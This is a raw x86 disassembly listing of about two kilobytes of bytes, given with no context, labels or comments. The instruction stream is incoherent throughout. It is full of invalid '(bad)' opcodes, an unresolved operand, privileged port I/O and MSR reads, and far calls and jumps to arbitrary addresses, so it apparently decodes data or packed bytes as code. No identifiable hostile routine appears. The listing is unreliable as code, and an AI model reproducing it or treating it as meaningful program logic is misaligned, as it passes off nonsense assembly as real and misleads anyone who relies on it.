  4165c9:	cmp    DWORD PTR [ebx+eax*4-0x759ad80c],0xffffffcf
  4165d1:	jle    0x416649
  4165d3:	sbb    eax,0x56549f7f
  4165d8:	mov    edx,0xc565daaf
  4165dd:	aam    0x33
  4165df:	in     eax,0x9
  4165e1:	mov    eax,ds:0xe9fcd5f9
  4165e6:	xchg   edx,eax
  4165e7:	push   ebx
  4165e8:	pop    esp
  4165e9:	inc    esp
  4165ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165eb:	nop
  4165ec:	dec    ecx
  4165ed:	int3   
  4165ee:	ror    BYTE PTR [edx+0x12],1
  4165f1:	int    0xf8
  4165f3:	and    ch,BYTE PTR [ebx]
  4165f5:	cmp    eax,0xbf0b222e
  4165fa:	dec    ecx
  4165fb:	mov    ah,0x5a
  4165fd:	test   DWORD PTR [edi+ebp*1+0x79f58c49],ebp
  416604:	stos   DWORD PTR es:[edi],eax
  416605:	gs push esi
  416607:	xchg   ebp,eax
  416608:	repnz or al,0xcf
  41660b:	lods   al,BYTE PTR ds:[esi]
  41660c:	dec    esi
  41660d:	in     al,dx
  41660e:	(bad)  
  41660f:	cmp    DWORD PTR [eax-0x44],edi
  416612:	add    bh,BYTE PTR [edx]
  416614:	(bad)  
  416615:	repz add al,0xb4
  416619:	call   0xd64f:0xaa99c675
  416620:	mov    esp,0x86b1101c
  416625:	push   0x39
  416627:	add    esp,DWORD PTR [ebp+0x3]
  41662a:	cmp    al,0xd
  41662c:	mov    esi,0x8b554d1d
  416631:	push   edx
  416632:	push   es
  416633:	ret    0xb9cb
  416636:	out    0xb3,eax
  416638:	adc    eax,0x34eccc03
  41663d:	retf   
  41663e:	adc    al,0x11
  416640:	jmp    0xd7fae3cf
  416645:	and    ecx,edx
  416647:	out    0x7,al
  416649:	xchg   ebx,eax
  41664a:	sub    esp,esi
  41664c:	ins    DWORD PTR es:[edi],dx
  41664d:	jae    0x416620
  41664f:	mov    ebp,0x4a78c38f
  416654:	fnstenv [eax]
  416656:	mov    WORD PTR [ebp-0x1d],ss
  416659:	mov    eax,ds:0xf811f8a7
  41665e:	repnz aaa 
  416660:	call   0xba4f:0x3908efb1
  416667:	vcmppd ymm2,ymm6,YMMWORD PTR [ebx],0x82
  41666c:	and    al,BYTE PTR [edi-0x4fad19fa]
  416672:	inc    edx
  416673:	sbb    BYTE PTR [edx-0x25de8049],al
  416679:	sbb    al,BYTE PTR [ebp-0x6d1ce5b3]
  41667f:	(bad)  [ebx+eiz*1-0x7cd11da3]
  416686:	cdq    
  416687:	jge    0x4166a6
  416689:	fdivr  st(3),st
  41668b:	(bad)  
  41668d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41668e:	cwde   
  41668f:	and    cl,dl
  416691:	fild   QWORD PTR [ecx-0x4f]
  416694:	leave  
  416695:	nop
  416696:	mov    DWORD PTR [ecx+0x50],ebx
  416699:	cdq    
  41669a:	popa   
  41669b:	sbb    BYTE PTR [esi+0x34],0xf4
  41669f:	sub    al,0x3c
  4166a1:	inc    esp
  4166a2:	out    0x9,eax
  4166a4:	(bad)  
  4166a5:	pop    ds
  4166a6:	das    
  4166a7:	xchg   ebp,eax
  4166a8:	test   DWORD PTR [ecx-0x34acb5a1],0x57be63ea
  4166b2:	pusha  
  4166b3:	pop    edx
  4166b4:	shr    DWORD PTR [ecx+0x6b12dcf5],0xa6
  4166bb:	call   0xc531:0xa0768918
  4166c2:	ror    BYTE PTR [esi],1
  4166c4:	push   ecx
  4166c5:	sahf   
  4166c6:	aam    0x52
  4166c8:	pop    esp
  4166c9:	sbb    BYTE PTR [ecx-0x4b],bl
  4166cc:	mov    esi,0x8424e901
  4166d1:	addr16 lock and DWORD PTR [bp-0x2374],ebx
  4166d8:	es dec ecx
  4166da:	pop    ds
  4166db:	xor    esi,DWORD PTR [ebx-0x39694875]
  4166e1:	jecxz  0x41670c
  4166e3:	sbb    DWORD PTR [edx],esp
  4166e5:	mov    bl,BYTE PTR [ebx]
  4166e7:	out    dx,al
  4166e8:	aaa    
  4166e9:	bound  ebp,QWORD PTR [eax+0x68]
  4166ec:	mov    ecx,0x942340e5
  4166f1:	push   0x32
  4166f3:	sbb    eax,DWORD PTR [ebx-0x79]
  4166f6:	push   esp
  4166f7:	push   ds
  4166f8:	xchg   edx,eax
  4166f9:	sub    DWORD PTR [ebp+0x29],0x70b6572a
  416700:	pop    ss
  416701:	xchg   edi,eax
  416702:	test   DWORD PTR [eax-0x29],ebp
  416705:	jne    0x416692
  416707:	aad    0xda
  416709:	repz mov ch,0xf6
  41670c:	data16 in al,dx
  41670e:	(bad)
  416711:	call   0xf67ede31
  416716:	pop    edx
  416717:	fld    DWORD PTR [eax+0x7fb81f1]
  41671d:	fsub   st(4),st
  41671f:	mov    eax,0x3700a3ee
  416724:	test   DWORD PTR ds:0x489a5cdb,edi
  41672a:	nop
  41672b:	xor    BYTE PTR [ebx],ch
  41672d:	push   edx
  41672e:	and    ebp,DWORD PTR [ebp+0x3ae4b0b4]
  416734:	cli    
  416735:	or     esi,DWORD PTR [edi+0x4201dc26]
  41673b:	add    edi,DWORD PTR [edx+0x2689fc2d]
  416741:	xlat   BYTE PTR ds:[ebx]
  416742:	sub    cl,0xc0
  416745:	or     al,0x9
  416747:	pushw  cs
  416749:	or     bh,BYTE PTR [edi+0x14f0277a]
  41674f:	xor    al,0x25
  416751:	(bad)  
  416752:	jl     0x4167cf
  416754:	clc    
  416755:	jge    0x4167c7
  416757:	xlat   BYTE PTR ds:[ebx]
  416758:	cmp    DWORD PTR [edi],esp
  41675a:	or     BYTE PTR [edi-0x620c1da9],bh
  416760:	or     BYTE PTR [edi-0x78b9ad80],ch
  416766:	inc    ebx
  416768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416769:	rol    ebp,cl
  41676b:	xor    al,0xe4
  41676d:	pushf  
  41676e:	in     eax,dx
  41676f:	push   eax
  416770:	mov    ebp,DWORD PTR [ebx]
  416772:	ret    
  416773:	hlt    
  416774:	inc    edx
  416775:	xor    ah,BYTE PTR [edi+0x257342d8]
  41677b:	mov    al,0xc1
  41677d:	xor    DWORD PTR [ebx-0x30],ecx
  416780:	(bad)  
  416781:	xor    bl,BYTE PTR [esi+0x4f]
  416784:	adc    eax,0x160f722f
  416789:	rcl    BYTE PTR ss:[ecx+0x3d],1
  41678d:	mov    dl,0x8e
  41678f:	mov    BYTE PTR ds:0x7f9df90e,ch
  416795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416796:	jl     0x41672e
  416798:	ss inc esp
  41679a:	and    BYTE PTR [edi],dl
  41679c:	aad    0xae
  41679e:	(bad)  
  41679f:	popf   
  4167a0:	aas    
  4167a1:	sub    dh,bh
  4167a3:	xchg   edx,eax
  4167a4:	push   edx
  4167a5:	imul   eax,DWORD PTR [edi+0x5ac8a36d],0xf881e55b
  4167af:	ins    DWORD PTR es:[edi],dx
  4167b0:	fsubr  QWORD PTR [ecx+0x6fcaf01]
  4167b6:	cld    
  4167b7:	js     0x416795
  4167b9:	imul   edx,DWORD PTR [edx-0x7d],0x9ccb9f5b
  4167c0:	stos   BYTE PTR es:[edi],al
  4167c1:	test   BYTE PTR [esi+0x2a77d1b1],0x83
  4167c8:	aaa    
  4167c9:	sbb    ecx,DWORD PTR [edx-0x7c]
  4167cc:	mov    bh,0xd7
  4167ce:	arpl   bx,ax
  4167d0:	popf   
  4167d1:	push   0xd59c769b
  4167d6:	in     al,0xf5
  4167d8:	push   0xffffffde
  4167da:	dec    edi
  4167db:	mov    edx,0xea8fb3d4
  4167e0:	in     eax,0xb1
  4167e2:	test   BYTE PTR [ecx-0x31],bl
  4167e5:	mov    ebx,0xed785f09
  4167ea:	push   ebx
  4167eb:	mov    WORD PTR [edi],ss
  4167ed:	pop    ebx
  4167ee:	jb     0x41679b
  4167f0:	std    
  4167f1:	push   ebx
  4167f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f3:	loopne 0x416778
  4167f5:	pop    ds
  4167f6:	dec    ebp
  4167f7:	cmp    al,0xd6
  4167f9:	mov    edx,0xc506e26
  4167fe:	aad    0xd7
  416800:	fdiv   DWORD PTR [eax]
  416802:	aad    0xc8
  416804:	mov    BYTE PTR ds:0x8b492fa5,al
  41680a:	pop    ebp
  41680b:	sbb    DWORD PTR [eax-0x304c0bf8],esi
  416811:	and    eax,ebp
  416813:	fmulp  st(2),st
  416815:	pushf  
  416816:	jle    0x4167ab
  416818:	imul   esp,DWORD PTR [eax],0x8a2986a
  41681e:	or     ebp,DWORD PTR [edx-0x37e4058d]
  416824:	(bad)  
  416826:	push   edx
  416827:	sub    esi,DWORD PTR [ebp-0x44]
  41682a:	loop   0x41685c
  41682c:	lea    ebp,[edx+0x299fb90a]
  416832:	push   ss
  416833:	dec    ecx
  416834:	xchg   edx,eax
  416835:	xor    eax,0xa4da8238
  41683a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41683b:	xor    al,0xf3
  41683d:	add    al,0xd3
  41683f:	push   di
  416841:	pusha  
  416842:	cmp    BYTE PTR [edx-0x7b],ah
  416845:	icebp  
  416846:	mov    bl,0x6
  416848:	sub    esp,DWORD PTR [ebx-0x41]
  41684b:	pop    ss
  41684c:	je     0x416893
  41684e:	pop    es
  41684f:	fmul   DWORD PTR [ebp-0x66625fc6]
  416855:	(bad)  
  416856:	mov    ds:0x5648c39e,eax
  41685b:	add    eax,DWORD PTR [edx+eax*8-0x2]
  41685f:	push   ecx
  416861:	mov    ds:0x2e589480,eax
  416866:	jo     0x4168dc
  416868:	hlt    
  416869:	sub    al,0xd3
  41686b:	xchg   ecx,eax
  41686c:	and    ecx,DWORD PTR [edi]
  41686e:	mov    al,0x61
  416870:	pop    es
  416871:	arpl   WORD PTR [esi-0x4ee75c55],di
  416877:	shr    ebx,0x6c
  41687a:	mov    eax,ds:0x9f6b83fa
  41687f:	inc    ebp
  416880:	cwde   
  416881:	push   ebx
  416882:	sti    
  416883:	push   0x89b1b69b
  416888:	jnp    0x4168d8
  41688a:	mov    BYTE PTR [esi+0x0],dh
  41688d:	out    0x75,eax
  41688f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416890:	and    edx,ebp
  416892:	call   0xafb9:0xc50b297b
  416899:	es aas 
  41689b:	push   cs
  41689c:	push   edx
  41689d:	inc    ebx
  41689e:	data16 jbe 0x416841
  4168a1:	lock stc 
  4168a3:	xor    ecx,esi
  4168a5:	fist   WORD PTR [ecx]
  4168a7:	jmp    0x484d:0xa459fdb7
  4168ae:	mov    dl,0x76
  4168b0:	mov    edx,0xd6fffd6c
  4168b5:	in     eax,dx
  4168b6:	cmp    BYTE PTR [ebp+0x58],bl
  4168b9:	loop   0x416847
  4168bb:	sub    eax,0xf76ae8b4
  4168c0:	xchg   esp,esi
  4168c2:	xchg   edx,eax
  4168c3:	inc    ebx
  4168c4:	add    eax,0x140c6ac
  4168c9:	mov    dh,0xb9
  4168cb:	inc    ecx
  4168cc:	lahf   
  4168cd:	aam    0x14
  4168cf:	sbb    BYTE PTR [ebx],dh
  4168d1:	pop    ds
  4168d2:	jp     0x41687a
  4168d4:	mov    DWORD PTR [esi],edx
  4168d6:	js     0x4168ac
  4168d8:	pop    ebx
  4168d9:	mov    edx,0x1a59eeaf
  4168de:	in     al,0xab
  4168e0:	sub    al,0x0
  4168e2:	xchg   ecx,eax
  4168e3:	mov    al,ds:0xdc0b773
  4168e8:	sahf   
  4168e9:	ins    DWORD PTR es:[edi],dx
  4168ea:	mov    ebp,0x9deec6d9
  4168ef:	and    al,cl
  4168f1:	sub    dl,ah
  4168f3:	repnz pushf 
  4168f5:	pop    esp
  4168f6:	out    dx,eax
  4168f7:	add    BYTE PTR [esi],ch
  4168f9:	aad    0xeb
  4168fb:	jl     0x4168d7
  4168fd:	ds js  0x416937
  416900:	mov    al,BYTE PTR ds:0x23faf26a
  416906:	cmp    dl,bh
  416908:	sbb    DWORD PTR [eax-0x7f285364],0x2b942d4e
  416912:	(bad)  [edx]
  416914:	out    0xb4,al
  416916:	pop    ds
  416917:	jno    0x4168a4
  416919:	jmp    0xfb17fc9d
  41691e:	jb     0x41697d
  416920:	shr    bh,1
  416922:	lahf   
  416923:	mov    DWORD PTR [ecx+0x5e],ecx
  416926:	and    BYTE PTR [edx+0x249ed9f9],dl
  41692c:	push   ebx
  41692d:	ss popa 
  41692f:	fstp   TBYTE PTR [ecx]
  416931:	dec    cx
  416933:	std    
  416934:	sub    DWORD PTR [edx+0x7e],0xffffffd6
  416938:	fwait
  416939:	mov    ecx,0xa06f6b97
  41693e:	and    DWORD PTR [esi-0x2c],ecx
  416941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416942:	xor    al,0x3c
  416944:	push   ebp
  416945:	repnz push edx
  416947:	loope  0x4168ea
  416949:	stc    
  41694a:	xchg   esi,ebp
  41694c:	cdq    
  41694d:	mov    ecx,0x42ae0595
  416952:	rcl    edi,cl
  416954:	loope  0x4168fa
  416956:	imul   ebp,DWORD PTR [edi-0xc],0xffffffef
  41695a:	mov    ch,0x66
  41695c:	mov    edi,0x35eeacc0
  416961:	jge    0x4169cd
  416963:	fistp  DWORD PTR [ebp-0x4e]
  416966:	jnp    0x4168f4
  416968:	adc    al,0xe4
  41696a:	mov    ch,0xd9
  41696c:	lock in eax,0x22
  41696f:	push   ss
  416970:	mov    dl,0xcf
  416972:	push   ecx
  416973:	cmp    esp,DWORD PTR [eax+0x23]
  416976:	and    al,0x51
  416978:	sub    DWORD PTR [esi],edi
  41697a:	fistp  QWORD PTR [esi-0x7c9240b0]
  416980:	pop    es
  416981:	aas    
  416982:	sub    esp,DWORD PTR [ecx-0x6a]
  416985:	push   0xffffffdc
  416987:	adc    al,0x3b
  416989:	push   eax
  41698a:	outs   dx,DWORD PTR ds:[esi]
  41698b:	pop    ebx
  41698c:	shl    DWORD PTR [edx-0x4651cb0b],1
  416992:	fstp   DWORD PTR [ecx+0x54ce169a]
  416998:	sbb    al,0x10
  41699a:	lods   eax,DWORD PTR ds:[esi]
  41699b:	aam    0x41
  41699d:	hlt    
  41699e:	pop    edi
  41699f:	xchg   ecx,eax
  4169a0:	lods   eax,DWORD PTR ds:[esi]
  4169a1:	ds sbb al,0x9f
  4169a4:	ffreep st(2)
  4169a6:	ret    0x4936
  4169a9:	mov    ebp,0x5335144a
  4169ae:	in     al,dx
  4169af:	push   esp
  4169b0:	fsubrp st(2),st
  4169b2:	jge    0x4169e6
  4169b4:	and    DWORD PTR [edx-0x5f50dc5e],ebp
  4169ba:	(bad)  
  4169bb:	ins    DWORD PTR es:[edi],dx
  4169bc:	ret    
  4169bd:	sub    bh,BYTE PTR [eax]
  4169bf:	inc    ebp
  4169c0:	pop    ss
  4169c1:	imul   ebp,DWORD PTR [ebx+0x42c66471],0x74
  4169c8:	push   esi
  4169c9:	pop    edi
  4169ca:	fisub  DWORD PTR [eax]
  4169cc:	sbb    al,0x18
  4169ce:	imul   edi,DWORD PTR [ecx+0x4ff2bb54],0xcfd78dd
  4169d8:	sahf   
  4169d9:	jecxz  0x4169b6
  4169db:	sub    cl,0xb1
  4169de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169df:	mov    esp,0xf0622b07
  4169e4:	adc    esi,DWORD PTR [esp+edi*8+0xa995a43]
  4169eb:	(bad)  
  4169ec:	sub    DWORD PTR [esi-0x9],ebp
  4169ef:	sbb    eax,0x3d1282cb
  4169f4:	std    
  4169f5:	dec    ebp
  4169f6:	push   cs
  4169f7:	rcl    dl,cl
  4169f9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169fb:	jb     0x4169b5
  4169fd:	push   eax
  4169fe:	pop    ecx
  4169ff:	and    ecx,eax
  416a01:	mov    edi,0xbe6b6340
  416a06:	std    
  416a07:	and    eax,0x8e9b88de
  416a0c:	mov    dh,0x9c
  416a0e:	dec    edx
  416a0f:	mov    esp,0x82d1cfca
  416a14:	inc    ebx
  416a15:	rdmsr  
  416a17:	fwait
  416a18:	jne    0x416a6a
  416a1a:	adc    BYTE PTR [edx-0xd6acb07],al
  416a20:	dec    ebp
  416a21:	and    ecx,DWORD PTR [ecx]
  416a23:	cmp    BYTE PTR [ebx+0x15],0x18
  416a27:	xchg   edx,eax
  416a28:	or     al,0xcb
  416a2a:	mov    al,0x8b
  416a2c:	dec    ecx
  416a2d:	adc    al,0x39
  416a2f:	mov    BYTE PTR [ebp+ebx*1-0x18a234f3],ch
  416a36:	test   DWORD PTR [ecx+ebp*8-0x7],0xbc6d5a0b
  416a3e:	xor    BYTE PTR [eax-0x4a],dl
  416a41:	jp     0x4169e8
  416a43:	aad    0x46
  416a45:	stos   BYTE PTR es:[edi],al
  416a46:	pop    esi
  416a47:	hlt    
  416a48:	lahf   
  416a49:	pop    eax
  416a4a:	(bad)  [edx]
  416a4c:	adc    eax,ebp
  416a4e:	mov    bl,0xc8
  416a50:	jb     0x416a09
  416a52:	push   eax
  416a53:	mov    bh,0xbb
  416a55:	xchg   edx,eax
  416a56:	push   0x25
  416a58:	(bad)  [eax-0x1b1ebd20]
  416a5e:	and    DWORD PTR [edi+0x1a],0x35
  416a62:	retf   0x6ce5
  416a65:	ror    BYTE PTR [ebx],1
  416a67:	fisubr DWORD PTR [ebx+ebp*2-0x38d9486d]
  416a6e:	pushf  
  416a6f:	xchg   esp,eax
  416a70:	ds out dx,eax
  416a72:	fnstenv [eax+0x53607a9c]
  416a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a79:	test   DWORD PTR [eax+0x992fd9e],esp
  416a7f:	clc    
  416a80:	pop    ss
  416a81:	jmp    0x32be4d49
  416a86:	fdiv   st,st(6)
  416a88:	pop    ebp
  416a89:	call   0xe124bbe2
  416a8e:	out    0xec,al
  416a90:	jae    0x416abd
  416a92:	mov    dh,cl
  416a94:	mov    esp,0xf7a488ae
  416a99:	push   ecx
  416a9a:	xor    al,0xb1
  416a9c:	call   0xe64ac7a7
  416aa1:	mov    esp,0x3fd68c23
  416aa6:	push   0xbe678f48
  416aab:	cmp    BYTE PTR [esi+0x61],dh
  416aae:	push   0x34
  416ab0:	push   es
  416ab1:	adc    eax,DWORD PTR [edx-0x6d]
  416ab4:	dec    eax
  416ab5:	fstp   st(2)
  416ab7:	loope  0x416a40
  416ab9:	mov    edx,0xb7d72743
  416abe:	test   DWORD PTR [edi+0x79df7e5e],ecx
  416ac4:	push   ss
  416ac5:	pop    ds
  416ac6:	mov    bl,0x4f
  416ac8:	jne    0x416ae0
  416aca:	daa    
  416acb:	shl    BYTE PTR [ebx-0x6c7d877a],1
  416ad1:	retf   
  416ad2:	dec    edx
  416ad3:	mov    ch,0x83
  416ad5:	sub    eax,0xd81cf4b1
  416ada:	jmp    0x2bd69fc1
  416adf:	push   0xb795d155
  416ae4:	or     eax,0xff57b57d
  416ae9:	sbb    eax,0x8d6d5791
  416aee:	mov    al,0xac
  416af0:	mov    DWORD PTR [ebx-0x132edf41],eax
  416af6:	scas   eax,DWORD PTR es:[edi]
  416af7:	cld    
  416af8:	xor    al,0x97
  416afa:	retf   
  416afb:	cmp    al,0xba
  416afd:	mov    ebp,DWORD PTR [ebx]
  416aff:	outs   dx,BYTE PTR ds:[esi]
  416b00:	pop    esp
  416b01:	or     eax,0x50a09cf1
  416b06:	adc    edi,DWORD PTR [ebx+0x78]
  416b09:	xchg   esp,eax
  416b0a:	jne    0x416b8a
  416b0c:	call   0x2526fa9c
  416b11:	or     DWORD PTR [edi+0x5c1d0544],edi
  416b17:	jl     0x416b27
  416b19:	lds    ebp,FWORD PTR [esi-0x2a]
  416b1c:	adc    eax,0xa53e30e2
  416b21:	sbb    DWORD PTR [ebx+0x7],0x92fc940
  416b28:	or     ch,BYTE PTR [edx-0x1fe2a407]
  416b2e:	mov    dl,0x7a
  416b30:	cmp    al,0xf9
  416b32:	int    0xe0
  416b34:	or     al,0x54
  416b36:	stc    
  416b37:	or     eax,0xa430597d
  416b3c:	push   es
  416b3d:	nop
  416b3e:	cmp    DWORD PTR [eax+0x2c00759b],edi
  416b44:	pop    ebx
  416b45:	bound  esp,QWORD PTR [ebx-0x11]
  416b48:	cmp    bl,BYTE PTR [edx-0x20a3cf56]
  416b4e:	push   ecx
  416b4f:	arpl   WORD PTR fs:[ebx],si
  416b52:	out    dx,eax
  416b53:	xchg   ebp,eax
  416b54:	inc    edi
  416b55:	lahf   
  416b56:	and    ebp,DWORD PTR [eax+0x19fb423e]
  416b5c:	scas   eax,DWORD PTR es:[edi]
  416b5d:	in     al,dx
  416b5e:	xchg   ebp,eax
  416b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b60:	es ss add ax,0x7695
  416b66:	pop    edx
  416b67:	push   ecx
  416b68:	fwait
  416b69:	(bad)  
  416b6a:	pxor   mm6,QWORD PTR ds:0x9193723e
  416b71:	add    al,0x4d
  416b73:	mov    BYTE PTR [edi+edx*1-0x4003aac4],ah
  416b7a:	out    dx,eax
  416b7b:	push   ebp
  416b7c:	je     0x416b2b
  416b7e:	ss ja  0x416b70
  416b81:	leave  
  416b82:	pop    ebx
  416b83:	and    bh,BYTE PTR [edx+edx*4-0x6c]
  416b87:	dec    esp
  416b88:	ins    DWORD PTR es:[edi],dx
  416b89:	daa    
  416b8a:	push   cs
  416b8b:	inc    ebp
  416b8c:	or     DWORD PTR [edi],esi
  416b8e:	fild   DWORD PTR [edi+0x426ef97a]
  416b94:	arpl   WORD PTR [edx-0x60f0dca7],dx
  416b9a:	jg     0x416be7
  416b9c:	xor    dh,cl
  416b9e:	jp     0x416b68
  416ba0:	cld    
  416ba1:	push   ebp
  416ba2:	pop    ebp
  416ba3:	aaa    
  416ba4:	les    ecx,FWORD PTR [ebp+0x14f74de0]
  416baa:	xor    eax,0xe8925887
  416baf:	add    BYTE PTR [edx-0x52],bh
  416bb2:	imul   edx
  416bb4:	(bad)  [ebx-0x3a439e7f]
  416bba:	fwait
  416bbb:	adc    BYTE PTR [esi-0x53baea3e],dh
  416bc1:	dec    esp
  416bc2:	outs   dx,BYTE PTR ds:[esi]
  416bc3:	in     al,dx
  416bc4:	lock es pop ebx
  416bc7:	into   
  416bc8:	or     al,0x15
  416bca:	out    0x22,eax
  416bcc:	pop    ebx
  416bcd:	mov    DWORD PTR [edx],edx
  416bcf:	jp     0x416b69
  416bd1:	int    0x15
  416bd3:	call   0xd1e8:0x514422a3
  416bda:	je     0x416bb2
  416bdc:	mov    eax,ds:0x44635ecf
  416be1:	popf   
  416be2:	and    eax,DWORD PTR [edi+0x2ec6c297]
  416be8:	mov    eax,0x4395432f
  416bed:	add    esp,DWORD PTR [esi+0x5e01f0d9]
  416bf3:	xchg   ebp,eax
  416bf4:	inc    esp
  416bf5:	pop    ecx
  416bf6:	pop    ebp
  416bf7:	mov    cl,0x52
  416bf9:	xchg   edi,eax
  416bfa:	lods   eax,DWORD PTR ds:[esi]
  416bfb:	inc    ecx
  416bfc:	scas   al,BYTE PTR es:[edi]
  416bfd:	and    esp,DWORD PTR ss:[eax+ebp*4+0x34dd751c]
  416c05:	in     eax,dx
  416c06:	jge    0x416c3f
  416c08:	lahf   
  416c09:	adc    al,0xa
  416c0b:	pusha  
  416c0c:	aaa    
  416c0d:	std    
  416c0e:	pop    esi
  416c0f:	mov    bl,dh
  416c11:	cmp    BYTE PTR [edx],dh
  416c13:	in     eax,0xb5
  416c15:	stos   DWORD PTR es:[edi],eax
  416c16:	jo     0x416c02
  416c18:	jns    0x416c69
  416c1a:	pop    es
  416c1b:	add    ecx,ebx
  416c1d:	es out 0x3d,eax
  416c20:	fs fcomip st,st(0)
  416c23:	jge    0x416bf9
  416c25:	pusha  
  416c26:	icebp  
  416c27:	pop    ecx
  416c28:	loope  0x416c75
  416c2a:	test   DWORD PTR [ecx-0x16],eax
  416c2d:	push   ss
  416c2e:	lahf   
  416c2f:	xor    eax,ebp
  416c31:	mov    bl,BYTE PTR [ecx+0x64]
  416c34:	test   eax,0x420a2e90
  416c39:	mov    ?,WORD PTR [esi]
  416c3b:	pop    esp
  416c3c:	mov    ds:0x52b5bad4,eax
  416c41:	jnp    0x416c77
  416c43:	not    DWORD PTR [ebx+edx*8]
  416c46:	aam    0xdb
  416c48:	push   esi
  416c49:	jmp    0xfc9996c0
  416c4e:	jb     0x416c00
  416c50:	inc    esi
  416c51:	je     0x416c22
  416c53:	cmp    BYTE PTR [esi-0x3a],bl
  416c56:	push   ecx
  416c57:	aaa    
  416c58:	pop    ebx
  416c59:	fild   DWORD PTR [esi+eax*1-0x68]
  416c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c5e:	mov    al,0xe9
  416c60:	inc    edx
  416c61:	push   esp
  416c62:	in     al,0xc2
  416c64:	cdq    
  416c65:	pop    ss
  416c66:	aaa    
  416c67:	fs inc esp
  416c69:	sub    BYTE PTR [ecx-0x6a0cdde4],bh
  416c6f:	imul   esp,DWORD PTR ds:0x93fbb997,0x31
  416c76:	jno    0x416c1d
  416c78:	pop    edx
  416c79:	mov    bh,0x3
  416c7b:	pop    ebp
  416c7c:	test   esp,ebp
  416c7e:	inc    edx
  416c7f:	ret    
  416c80:	jmp    0x76a0:0xf801e23d
  416c87:	xchg   ebx,eax
  416c88:	sub    esi,edx
  416c8a:	js     0x416ce6
  416c8c:	and    DWORD PTR [ecx+0x297604c5],eax
  416c92:	dec    esi
  416c93:	pop    ecx
  416c94:	inc    edi
  416c95:	ret    0x33f6
  416c98:	fwait
  416c99:	xor    BYTE PTR [ecx],bh
  416c9b:	pop    edi
  416c9c:	mov    ss,esp
  416c9e:	rol    BYTE PTR [esi+0x7bdd9003],1
  416ca4:	xlat   BYTE PTR ds:[ebx]
  416ca5:	mov    bl,0x99
  416ca7:	loope  0x416c73
  416ca9:	and    bl,BYTE PTR [esi]
  416cab:	int3   
  416cac:	aaa    
  416cad:	shl    BYTE PTR [ecx+0x796f25d5],0x3d
  416cb4:	adc    BYTE PTR [ebx-0x1585da72],dl
  416cba:	scas   al,BYTE PTR es:[edi]
  416cbb:	mov    esp,0x77dadfaf
  416cc0:	or     eax,0x2a2781e2
  416cc5:	dec    esp
  416cc6:	fsubr  st(6),st
  416cc8:	mov    dh,0x7d
  416cca:	jecxz  0x416d16
  416ccc:	outs   dx,BYTE PTR ds:[esi]
  416ccd:	cmp    ch,cl
  416ccf:	and    eax,0x673ae3fa
  416cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cd5:	xor    ch,BYTE PTR [esp+ebp*4]
  416cd8:	cmp    al,bl
  416cda:	loope  0x416cc1
  416cdc:	fild   WORD PTR [ebp+0x48006451]
  416ce2:	adc    edi,DWORD PTR [esi+0x3]
  416ce5:	cmp    DWORD PTR [edx],0xffffff84
  416ce8:	lahf   
  416ce9:	add    al,0xb5
  416ceb:	push   edx
  416cec:	sub    dl,ch
  416cee:	pusha  
  416cef:	sbb    esi,DWORD PTR [ecx+ebx*2-0x65c33404]
  416cf6:	add    DWORD PTR gs:[esi+0x53fd2d63],ebx
  416cfd:	mov    bh,0xed
  416cff:	repnz mov dl,0x47
  416d02:	push   ebx
  416d03:	adc    DWORD PTR [edx],0x2046d390
  416d09:	shl    DWORD PTR [ebp-0x5f],cl
  416d0c:	inc    ecx
  416d0d:	jbe    0x416d1f
  416d0f:	sti    
  416d10:	fdivr  DWORD PTR [ebp+edx*8-0x437d63ca]
  416d17:	xchg   ebx,eax
  416d18:	adc    al,BYTE PTR [edi-0x5701cb64]
  416d1e:	mov    esp,0x10e80018
  416d23:	mov    edx,0x452d67d2
  416d28:	les    edx,FWORD PTR [ecx+ebx*8]
  416d2b:	jle    0x447e2c5b
  416d31:	inc    edx
  416d32:	into   
  416d33:	xlat   BYTE PTR ds:[ebx]
  416d34:	xor    dl,BYTE PTR [edi]
  416d36:	mov    cs,WORD PTR ss:[esi-0x31ffb0cf]
  416d3d:	add    bh,dh
  416d3f:	mov    al,0x3b
  416d41:	(bad)  
  416d42:	stc    
  416d43:	fisttp DWORD PTR [esi+0x3a]
  416d46:	es or  eax,0x35ae39d3
  416d4c:	jge    0x416cdc
  416d4e:	mov    bl,0x8a
  416d50:	push   edx
  416d51:	add    eax,0x936f3073
  416d56:	jge    0x416cde
  416d58:	mov    ecx,0x8c7cd3cf
  416d5d:	dec    ebx
  416d5e:	out    dx,eax
  416d5f:	and    BYTE PTR [eax-0x78efa5a8],ch
  416d65:	mov    WORD PTR [eax+0x70ba9e10],ds
  416d6b:	inc    ecx
  416d6c:	gs call 0xdefe:0xdc2c2992
  416d74:	add    BYTE PTR [edi-0x4d924d8a],al
  416d7a:	mov    bh,0x7d
  416d7c:	lds    esi,FWORD PTR [eax-0x145c9d26]
  416d82:	pop    ecx
  416d83:	and    DWORD PTR [ebx+0x4e27987],0xbce096dc
  416d8d:	dec    esi
  416d8e:	push   edi
  416d8f:	loop   0x416e00
  416d91:	pusha  
  416d92:	mov    bl,0xd0
  416d94:	and    DWORD PTR [esp+eax*4+0x5c3b779a],edx
  416d9b:	jae    0x416d4f
  416d9d:	push   ebx
  416d9e:	in     eax,0xf4
  416da0:	sub    BYTE PTR [esp+eiz*2-0xa],bl
  416da4:	inc    esi
  416da5:	or     al,0xd4
  416da7:	dec    eax
  416da8:	pop    ss
  416da9:	loope  0x416da3
  416dab:	ret    0x8086
  416dae:	retf   
  416daf:	sahf   
  416db0:	loop   0x416dbc
  416db2:	mov    dl,BYTE PTR [ecx]
  416db4:	rcr    DWORD PTR [ecx],0xe3
  416db7:	fistp  QWORD PTR [edx-0x2c]
  416dba:	ja     0x416d4e
  416dbc:	xchg   esp,eax
  416dbd:	cld    
